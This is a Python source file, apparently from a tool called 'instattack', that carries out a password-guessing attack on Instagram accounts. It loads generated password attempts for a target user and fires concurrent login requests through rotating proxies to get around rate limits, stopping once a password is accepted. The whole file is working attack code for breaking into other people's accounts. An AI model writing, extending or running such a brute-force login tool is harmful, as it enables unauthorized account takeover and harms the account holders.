from __future__ import absolute_import

import asyncio
import aiohttp
import aiojobs
import collections

from instattack import logger
from instattack.src.utils import percentage

from .models import LoginAttemptContext, LoginContext, InstagramResults
from .exceptions import NoPasswordsError
from .requests import RequestHandler
from .utils import limit_on_success, limit_as_completed


"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""


class LoginHandler(RequestHandler):

    __name__ = 'Login Handler'

    def __init__(self, config, proxy_handler, **kwargs):
        super(LoginHandler, self).__init__(config, proxy_handler, **kwargs)

        self.limit = config.get('limit')
        self.batch_size = config['batch_size']
        self.attempt_batch_size = config['attempts']['batch_size']

        self.log_login = config['log']

        self.passwords = asyncio.Queue()

        self.num_completed = 0
        self.login_index = 0  # Index for the current password and attempts per password.
        self.attempts_count = collections.Counter()  # Indexed by Password
        self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID

    async def run(self, loop):
        log = logger.get_async(self.__name__, subname='attack')
        log.start('Running')

        await self.prepopulate(loop)
        return await self.attack(loop)

    async def attempt_single_login(self, loop, password):
        log = logger.get_async(self.__name__, subname='attack')
        log.start('Starting Single Login')

        await self.passwords.put(password)
        results = await self.attack(loop)
        return results.results[0]

    async def attack(self, loop):
        log = logger.get_async(self.__name__, subname='attack')
        log.start('Starting Attack')

        scheduler = await aiojobs.create_scheduler(limit=100, exception_handler=None)
        results = await self.attempt_login(loop, scheduler)
        return results

    async def prepopulate(self, loop):
        log = logger.get_async(self.__name__, subname='prepopulate')

        if self.limit:
            log.start(f'Generating {self.limit} Attempts for User {self.user.username}.')
        else:
            log.start(f'Generating All Attempts for User {self.user.username}.')

        futures = []
        async for password in self.user.generate_attempts(loop, limit=self.limit):
            futures.append(self.passwords.put(password))

        await asyncio.gather(*futures)
        if len(futures) == 0:
            raise NoPasswordsError()

        log.complete(f"Prepopulated {len(futures)} Password Attempts")

    async def attempt_login(self, loop, scheduler):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = logger.get_async(self.__name__, subname='attempt_login')
        log.disable_on_false(self.log_login)

        results = InstagramResults(results=[])

        async def login_task_generator(session):
            """
            Generates coroutines for each password to be attempted and yields
            them in the generator.

            We don't have to worry about a stop event if the authenticated result
            is found since this will generate relatively quickly and the coroutines
            have not been run yet.
            """
            while not self.passwords.empty():
                password = await self.passwords.get()
                if password:
                    context = LoginContext(
                        index=self.login_index,
                        password=password
                    )
                    self.login_index += 1
                    yield self.attempt_with_password(loop, session, context, scheduler)

        await log.debug('Waiting on Start Event...')
        await self.start_event.wait()

        await log.debug('Fetching Cookies')
        cookies = await self.cookies()

        await log.debug('Starting Client Session')

        async with aiohttp.ClientSession(
            connector=self._connector,
            cookies=cookies,
            timeout=self._timeout,
        ) as session:

            gen = login_task_generator(session)

            async for result in limit_as_completed(gen, self.batch_size):
                await log.debug('Generator Returned Result')

                # Generator Does Not Yield None on No More Coroutines
                if not result.conclusive:
                    raise RuntimeError("Result should be valid and conclusive.")

                self.num_completed += 1
                log.success(
                    f'Percent Done: {percentage(self.num_completed, self.login_index)}')

                if result.authorized:
                    await scheduler.spawn(self.user.create_or_update_attempt(
                        result.context.password, success=True))
                    results.add(result)
                    break

                else:
                    if not result.not_authorized:
                        raise RuntimeError('Result should not be authorized.')

                    results.add(result)
                    await scheduler.spawn(self.user.create_or_update_attempt(
                        result.context.password, success=False))

        await log.complete('Closing Session')
        await asyncio.sleep(0)

        await scheduler.close()
        return results

    async def attempt_with_password(self, loop, session, context, scheduler):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.
        """
        log = logger.get_async(self.__name__, subname="attempt_with_password")

        # TODO:  We should figure out a way to allow proxies to repopulate and wait
        # on them for large number of password requests.  We don't want to bail when
        # there are no more proxies because we might be using them all currently

        async def login_attempt_task_generator():
            """
            Generates coroutines for each password to be attempted and yields
            them in the generator.

            We don't have to worry about a stop event if the authenticated result
            is found since this will generate relatively quickly and the coroutines
            have not been run yet.
            """
            while True:
                proxy = await self.proxy_handler.pool.get()
                if not proxy:
                    # TODO: Raise Exception Here Instead
                    log.error('No More Proxies in Pool')
                    break

                if proxy.unique_id in self.proxies_count:
                    log.warning(
                        f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                        extra={'proxy': proxy}
                    )

                new_context = LoginAttemptContext(
                    index=self.attempts_count[context.password],
                    parent_index=context.index,
                    password=context.password,
                    proxy=proxy,
                )

                self.proxies_count[proxy.unique_id] += 1
                self.attempts_count[context.password] += 1
                yield self.login_request(loop, session, new_context, scheduler)

        # Wait for start event to signal that we are ready to start making
        # requests with the proxies.
        await self.start_event.wait()

        log.start(f'Atempting Login with {context.password}')

        result = await limit_on_success(
            login_attempt_task_generator(),
            self.attempt_batch_size
        )

        log.complete(f'Done Attempting Login with {context.password}', extra={
            'other': result
        })
        return result
